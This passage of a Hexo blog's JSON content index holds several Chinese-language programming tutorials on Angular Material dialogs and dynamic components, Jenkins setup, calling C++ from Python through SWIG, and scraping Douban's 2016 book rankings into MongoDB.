interface CustomDialogData&#123; title:string; content:string; isOkButton:boolean; isNoButton:boolean; OkEvent?:Function; NoEvent?:Function; OkButtonContent?:string; NoButtonContent?:string;&#125; 这样，就可以在打开这个对话框的时候，传一个 CustomDialogData的对象，就能根据这些信息配置对话框5、datepicker这里主要讲怎么换成中文，因为默认是按照老美那边的标识的，所以要用在我们这边，就需要做一些改动首先，安装 momentjs momentjs: JavaScript 日期处理类库 npm install moment --save然后按照官网的例子123456789101112131415@Component(&#123; ... providers: [ // The locale would typically be provided on the root module of your application. We do it at // the component level here, due to limitations of our example generation script. &#123; provide: MAT_DATE_LOCALE, useValue: 'zh-cn' &#125;, // `MomentDateAdapter` and `MAT_MOMENT_DATE_FORMATS` can be automatically provided by importing // `MatMomentDateModule` in your applications root module. We provide it at the component level // here, due to limitations of our example generation script. &#123; provide: DateAdapter, useClass: MomentDateAdapter, deps: [MAT_DATE_LOCALE] &#125;, &#123; provide: MAT_DATE_FORMATS, useValue: MAT_MOMENT_DATE_FORMATS &#125;, ],&#125;) ... 将{ provide: MAT_DATE_LOCALE, useValue: &#39;zh-cn&#39; },的useValue改成&#39;zh-cn就是中文了，具体时区代号参考 ##四、总结总的来说 Angular Material 组件集成了很多东西，也方便了我们的使用，适合敏捷开发，但是会带来一些依赖性的问题，比如你要为了使用 Angular Material 而改变接口的格式或者和后端的一些对接问题。但是 Angular Material 可以更加复用，我只是很低程度的复用而已","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"angular2","slug":"angular2","permalink":"https://recallhyx.github.io/tags/angular2/"}]},{"title":"配置Jenkins","slug":"配置Jenkins","date":"2017-10-19T13:01:57.000Z","updated":"2018-01-19T15:36:05.710Z","comments":true,"path":"2017/10/19/配置Jenkins/","link":"","permalink":"https://recallhyx.github.io/2017/10/19/配置Jenkins/","excerpt":"","text":"哈哈哈，终于搞定持续集成的配置了，买来的阿里云服务器也能发挥一点作用了，来记录一下怎么在阿里云服务器上配置持续集成 ####首先，什么是持续集成简单来说，就是代码提交到 Git 或者 SVN 上的时候，会帮你build项目，然后跑测试，如果在build项目或者跑测试的时候出现错误，构建就会失败，然后能够通知你哪里出错了，如果没有错误，就会帮你发布项目（这么一看是不是很爽，每次提交代码就能自动构建）我们使用的持续集成工具就是 Jenkins ####下载Jenkins 我们下载的是 .war后缀的，下载下来是一个包，需要装 Java 才能进行操作，怎么在服务器上装 Java 就不详细描述了 ####启动Jenkins下载好 Jenkins ，安装且配置好 Java 后，我们只需要输入这条语句java -jar jenkins.war 就能启动Jenkins第一次启动 Jenkins会给一个秘钥 如果忘记了秘钥，就可以到.jenkins/secrets/initialAdminPassword这个文件找注意：这个文件是隐藏的，要在命令行用ls -a这个命令来显示启动后，就可以在浏览器输入网址来看，默认是8080端口http://localhost:8080 把上一步得到的秘钥输进去就能进到jenkins的页面了 安装推荐的插件就够用了， 之后也能自己下载 这就是界面了 ####Github配置由于我们使用Github来做代码管理的，所以我们在自己的服务器上安装Git后生成ssh，添加到我们Github仓库 ####新建项目 新建一个自由风格的项目 点击保存，退出到主界面，点击立即构建 就构建好了在/root/.jenkins/workspace可以看到我们的项目以后每次提交代码都会触发构建，至于发布都要写在配置里面的Excute Shell里面，也可以写成一个脚本文件，到时候执行这个脚本 总的来说是挺多坑坑坑坑坑坑坑的，国庆配这个jenkins配得怀疑人生，有很多坑其实是脚本的坑，要自己多尝试","categories":[{"name":"运维","slug":"运维","permalink":"https://recallhyx.github.io/categories/运维/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"https://recallhyx.github.io/tags/Jenkins/"}]},{"title":"Python调用C++的方式","slug":"Python调用C的方式","date":"2017-09-22T13:47:18.000Z","updated":"2018-01-27T07:03:15.481Z","comments":true,"path":"2017/09/22/Python调用C的方式/","link":"","permalink":"https://recallhyx.github.io/2017/09/22/Python调用C的方式/","excerpt":"","text":"（国庆前夕来完成每月一篇博文的任务）这次来讲讲怎么将 c++和 python 结合在一起，主要是由 python 来调用 c++的函数首先，我们需要一个东西 swig （这网站看起来很旧，但其实swig是有在更新的） 点击下载最新版就行了 什么是SWIG ? SWIG是一个能将C或者C++编写的程序与其它各种高级语言如Perl, Python, Ruby, 和 Tcl进行联接的开发工具。其原理是从C/C++头文件中找到申明并利用他们生成脚本语言访问C/C++代码所必须的封装代码。SWIG具有高度可自定义的特点，它能帮助你生成适合你的应用程序的封装包。 所以，我们借助 SWIG 把 c++代码编译成 python 能够引用的模块，就能在python里调用c++了 下载解压完成之后我们还要配环境变量 这样第一步就行了第二步，我们要先写 c++ 的函数我们需要三个文件hello.h------------头文件hello.cpp---------源文件hello.i-------------配置文件 我们在hello.h声明一个函数 Hello(char *str)这里不能用string，python调用有问题，具体不清楚，参数为char \\则可以调用* 然后在 hello.cpp实现这个函数 最后配置文件hello.i #define SWIG_FILE_WITH_INIT这句规定了要被编译成 python的模块#include &quot;hello.h&quot;给出需要包含的头文件void Hello(char * str);在 hello.i这个文件的最后给出想要编译的函数第三步，使用命令编译打包在命令行输入swig -python -c++ hello.i编译，成功之后就会生成hello_wrap.cxx这个文件第四步，我们还需要写一个名为setup.py的python文件 在第三步打包的模块还缺少动态链接库，所以我们需要这个 setup.py来生成python使用的动态链接库在命令行中输入python setup.py build_ext --inplace成功后会生成_hello.cp35-win_amd64.pyd这个文件第五步，把生成的两个文件都放到要用的python目录下，就可以在python里面调用了 大功告成 !成功的调用了c++的函数，大家可以自行发挥了","categories":[{"name":"后端","slug":"后端","permalink":"https://recallhyx.github.io/categories/后端/"}],"tags":[{"name":"python","slug":"python","permalink":"https://recallhyx.github.io/tags/python/"}]},{"title":"Angular2移除console","slug":"Angular2移除console","date":"2017-09-04T11:19:16.000Z","updated":"2018-01-27T07:02:24.929Z","comments":true,"path":"2017/09/04/Angular2移除console/","link":"","permalink":"https://recallhyx.github.io/2017/09/04/Angular2移除console/","excerpt":"","text":"(拖更一个月啦，又来记录一些在项目开发中用到的东西)这是只是一个小技巧而已 我们在Angular开发过程中，都会用console.log()这个函数来输出一些东西在开发完成后，我们想去掉 console.log() ，当然可以一个个找到并删除，但是这样太费时费力了，我也试过在配置文件 tslint.json里面加入 &quot;no-console&quot;:{true,&quot;log&quot;}这条规则来直接去除，但是也没什么卵用，后来找到一种方法，下面为介绍这种方法首先，我们先找到 environment.ts 这个文件 ，我的是在 src-&gt;app目录下 让我们点开来看看： 其实environment.ts这个文件是用来根据当前是处于开发环境还是发布环境来进行一些设置的，我们看到if(&#39;production&#39; === ENV) 就是说，当当前的 环境 是 production 也就是发布环境的时候，进行一些操作，对应的else就是说在开发环境，所以我们要在 发布环境做一些东西 其实只要这一句window.console.log=function () {}这句话的意思就是 替换 console.log()这个函数为空，为空就不会进行任何操作了嘛这样的好处是：1、原代码不用进行任何改动2、在开发环境中console.log()这个函数还是能正常工作","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"angular2","slug":"angular2","permalink":"https://recallhyx.github.io/tags/angular2/"}]},{"title":"Angular2动态加载组件","slug":"Angular2动态加载组件","date":"2017-07-01T03:21:23.000Z","updated":"2018-01-27T07:02:15.124Z","comments":true,"path":"2017/07/01/Angular2动态加载组件/","link":"","permalink":"https://recallhyx.github.io/2017/07/01/Angular2动态加载组件/","excerpt":"","text":"（日常水一下，由于6月要复习应付考试啥的，没时间写博客，本来想写一篇关于自动化测试的博文，最近又在学 Angular2，解决了一个技术问题，就先写这篇文章） 好的，进入正文，关于Angular2动态加载组件，之前在网上搜到的是用 DynamicComponentLoader()这个函数，但是这个函数在 Angular2就弃用了，于是再搜了一下，找到了这个函数ComponentFactoryResolver()接下来就来看一下怎么使用这篇博文借鉴了-&gt;这篇文章，上面他的实例的完整代码，但是我有自己的demo。第一步创建一个名为dynamic-component.directive.ts的文件123456789import &#123;Directive,ViewContainerRef&#125; from '@angular/core';@Directive(&#123; selector: '[appDynamicComponent]'&#125;)export class DynamicComponentDirective&#123; constructor(public viewContainerRef:ViewContainerRef)&#123;&#125;&#125; 代码在上面，首先，这个文件用了@Directive这个装饰器，简单来说就是找到html中带有 selector中属性的那个标签，在这里就是找到 标签中带有 appDybanucComponent这个属性的标签。然后我们export 一个类，这个类注入了ViewContainerRef，它可以让我们得知目前所在的HTML元素中包含的View內容，也可以通过它來改变View的结果(ex: 动态的产生Component、移除某个Component等等)。也就是说，这个文件做了两件事情，第一件事情就是找到要改变的标签，第二件事情就是对它进行改变。这里我们还导出了 DynamicComponentDirective 这个类，下面会用到第二步既然我们是对带有 appDynamicComponent的标签进行操作，那么我们的html里面某个标签有这个属性，在 app.component.html中写以下代码1234567891011121314151617181920&lt;div id=\"wrapper\"&gt; &lt;div id=\"body\" class=\"clearfix\"&gt; &lt;div id=\"left\"&gt; &lt;div class=\"inner\"&gt; left &lt;!--看这里--------------------------------------------------------------------------&gt; &lt;ng-template appDynamicComponent&gt;&lt;/ng-template&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"right\"&gt; &lt;div class=\"inner\"&gt; &lt;button class=\"button\" (click)=\"CreateGroup()\"&gt;添加组&lt;/button&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 上面的标签里面就有appDynamicComponent属性，于是就找到了对应的标签。我们还写了一个button，点击之后就会进入CreateGroup()这个函数，这个函数就是我们要加载组件的函数第三步我们找到了这个标签，接下来就要动态的加载组件了，那么我们应该就要有另外一个组件，创建一个名为text.component.ts的文件12345678import &#123;Component&#125; from '@angular/core'@Component(&#123; selector: 'text', template:'&lt;label&gt;text&lt;/label&gt;'&#125;)export class TextComponent&#123;&#125; 这个文件就只有一行文本 text而已，并且导出一个 TextComponent 这个类，我们之后会用到第四步接下来就开始进行加载了1234567891011121314151617181920212223242526import &#123;Component, ComponentFactoryResolver, ViewChild, &#125; from '@angular/core';import &#123;TextComponent&#125; from \"./text.component\";import &#123;DynamicComponentDirective&#125; from './dynamic-component.directive'@Component(&#123; selector: 'app-root', templateUrl: './app.component.html', styleUrls: ['./app.component.css'], entryComponents: [TextComponent]&#125;)export class AppComponent &#123; @ViewChild(DynamicComponentDirective) componentHost: DynamicComponentDirective; constructor(private componentFactoryResolver: ComponentFactoryResolver)&#123;&#125; CreateGroup()&#123; const componentFactory = this.componentFactoryResolver.resolveComponentFactory(TextComponent) const viewContainerRef = this.componentHost.viewContainerRef; viewContainerRef.clear(); const componentRef = viewContainerRef.createComponent(componentFactory); &#125;&#125; 首先我们看到在@Component这个装饰器里面多了一个entryComponents，意思是当加载了当前组件之后，告诉编译器去编译entryComponents数组里面的组件，之后就能给下一步使用了。然后我们看 AppComponent这个类它有一个@ViewChild装饰器，这个装饰器是用来访问一个类和这个类的方法的，访问的是DynamicComponentDIrective这个类，我们在第一步就创建了然后就是注入一个ComponentFactoryResolver这个类，好像是对组件进行处理，viewContainerRef这个变量赋值为 我们在DynamicComponentDirective里面的viewContainerRef。最后调用方法 viewContainerRef.createComponent(componentFactory)实例化组件，到这里还没完，我们要把用到的组件在 app.module.ts里面声明最后12345678910111213141516171819202122232425262728import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; NgModule &#125; from '@angular/core';import &#123; AppComponent &#125; from './app.component';import &#123; FormsModule &#125; from '@angular/forms'import &#123; WeUIModule&#125; from 'angular-weui'import &#123;TextComponent&#125; from \"./text.component\";import &#123;DynamicComponentDirective&#125; from \"./dynamic-component.directive\";@NgModule(&#123; declarations: [ AppComponent, TextComponent, DynamicComponentDirective ], imports: [ BrowserModule, FormsModule, WeUIModule ], entryComponents: [ TextComponent ], providers: [], bootstrap: [AppComponent]&#125;)export class AppModule &#123; &#125; 顺带一提我用的css样式123456789.clearfix &#123; *zoom: 1;&#125;.clearfix:after&#123; content: \"\"; display: block; height: 0; visibility:hidden; clear: both;&#125;#header&#123; width: 96%; height: 90px; margin: 0 auto; background: #f60;&#125;#body&#123; width: 96%; margin: 0 auto; clear: both;&#125;#left&#123; float: left; width: 50%; background: #ccc;float: left&#125;#right&#123; margin-left: 50%; background: orange; overflow: hidden; position: fixed;&#125; 效果图在没点击按钮的时候 之前 点击按钮之后 之后 总结其实一开始我是摸不着头脑的，不知道要怎么动态加载组件，上网找了好久也找不到，之后也是看别人的代码一步一步试才懂得，这个动态加载组件只是入门，我再挖掘一下其他用法","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"angular2","slug":"angular2","permalink":"https://recallhyx.github.io/tags/angular2/"}]},{"title":"python爬取动态页面","slug":"python爬取动态页面","date":"2017-04-28T11:10:12.000Z","updated":"2018-01-27T07:03:09.408Z","comments":true,"path":"2017/04/28/python爬取动态页面/","link":"","permalink":"https://recallhyx.github.io/2017/04/28/python爬取动态页面/","excerpt":"先水一下终于有空来写博客了，这个月有点忙（有点懒），好了，进入正题今天是要来记录一下 python动态爬取页面的，我们要爬取的页面就是豆瓣2016年度榜单","text":"先水一下终于有空来写博客了，这个月有点忙（有点懒），好了，进入正题今天是要来记录一下 python动态爬取页面的，我们要爬取的页面就是豆瓣2016年度榜单 豆瓣2016年度榜单页面 让我们看一下源代码，按 F12 界面 可以看到，这些页面会随着你滚轮的滚动动态加载，加载的内容也不一样，我们要做的，就是找出加载的文件 下一步 先点击 Network ，跳转到另外一个界面，随着滚轮滚动，我们可以看到，有一些东西不断被加载出来，名字是用数字编号的文件，点击看一下，发现没有，我们要找的东西就在这里！一开始我是以为这些文件全都是保存各个书信息的json，用一个循环可以直接找出我们要的信息，点了其他几个文件才发现，其实不是的 这些带数字的文件还保存着其他我们不要的信息，也没差，就是加个判断条件而已，那这个判断条件要怎么写呢？注意到 json 里面有一个 key： kind_cn，我们可以用这个来判断由于豆瓣这个年度榜单没有页码，我们就手动滚到最底部（或者滚到你想要的位置）然后查看对应的数字文件来找到对应的页码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import requestsimport json#引入MongoDBfrom pymongo import MongoClient#MongoDB的操作，我们会在其他博文细讲client = MongoClient()db = client['Books']book_collection = db['book']book_title = ''book_score = ''title = ''book_count = ''book_url = ''# IP = ''.join(\"113.107.112.210:8101\".strip())# proxy=&#123;'http':IP&#125;# 协议头headers = &#123; 'User-Agent': \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\",&#125; ##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）url = 'https://book.douban.com/ithil_j/activity/book_annual2016/widget/'page = 1#这里的 39 就是我自己想找的最后一个页面的数字while page&lt;=39: #requests包的用法，把我们之前构造好的 url 和 页码 进行拼接，才能够爬到下一个页面，关于 requests，我会在其他博文细讲 data = requests.get(url+str(page),headers=headers) #请求页面返回后的 json 我们用 json.loads() 这个方法，把它变成python里面的字典类型，关于json，我会在其他博文细讲 value = json.loads(data.text) #进行判断，如果是书摘的话，就跳过 if value['res']['kind_cn']==u'书摘': page+=1 continue #这里面还有一个分支，有一些是 top 10 ，有一些是 top 5 if value['res']['kind_str']=='top10': for i in range(0,10): book_title=value['res']['subjects'][i]['title'] book_score=value['res']['subjects'][i]['rating'] book_count = value['res']['subjects'][i]['rating_count'] book_url = value['res']['subjects'][i]['url'] title = value['res']['payload']['title'] post = &#123; '主题':title, '书名':book_title, '评分':book_score, '评分人数':book_count, '链接':book_url &#125; book_collection.save(post) # print(book_title) # print(book_score) # print(book_count) # print(book_url) # print(title) if value['res']['kind_str']=='top5': for i in range(0,5): book_title=value['res']['subjects'][i]['title'] book_score=value['res']['subjects'][i]['rating'] book_count = value['res']['subjects'][i]['rating_count'] book_url = value['res']['subjects'][i]['url'] title = value['res']['payload']['title'] post = &#123; '主题':title, '书名':book_title, '评分':book_score, '评分人数':book_count, '链接':book_url &#125; book_collection.save(post) print('第'+ str(page) +'页爬取完毕') # print(value) page+=1 最终就是这样啦，上面的代码就是全部了，其实还能把一些东西抽出来作为函数，但是我还是挺忙的（懒）所以留给读者去做了，可能以后还会更新，看吧，哈哈哈上面有一些东西是需要细讲的，比如，json啊，MongoDB啊，我会另写博文，多多关注呀","categories":[{"name":"后端","slug":"后端","permalink":"https://recallhyx.github.io/categories/后端/"}],"tags":[{"name":"python","slug":"python","permalink":"https://recallhyx.github.io/tags/python/"}]},{"title":"一些有用的网站","slug":"一些有用的网站","date":"2017-04-08T07:50:07.000Z","updated":"2017-04-09T07:23:10.881Z","comments":true,"path":"2017/04/08/一些有用的网站/","link":"","permalink":"https://recallhyx.github.io/2017/04/08/一些有用的网站/","excerpt":"学习用的网站菜鸟教程:这个网站几乎包含了所有关于编程语言的新手入门教程和很多有用的工具，想要学习一门新的语言可以上这个网站","text":"学习用的网站菜鸟教程:这个网站几乎包含了所有关于编程语言的新手入门教程和很多有用的工具，想要学习一门新的语言可以上这个网站安卓Api:这个网站是官网的api，虽然全，但是藏的比较深，就贴出来了 Android 廖雪峰的官方网站:非常有用的网站，里面的教程也是适合新手和进阶的，而且评论区也挺热闹，老师也会回答你提出来的问题","categories":[],"tags":[{"name":"学习","slug":"学习","permalink":"https://recallhyx.github.io/tags/学习/"}]},{"title":"FirstBlog","slug":"FirstBlog","date":"2017-04-07T06:39:39.000Z","updated":"2017-04-09T07:24:06.429Z","comments":true,"path":"2017/04/07/FirstBlog/","link":"","permalink":"https://recallhyx.github.io/2017/04/07/FirstBlog/","excerpt":"","text":"你好呀，我是Recall，这是我的第一篇博客 我想知道要怎么写1print(\"Hello World\")","categories":[],"tags":[{"name":"first","slug":"first","permalink":"https://recallhyx.github.io/tags/first/"}]}]}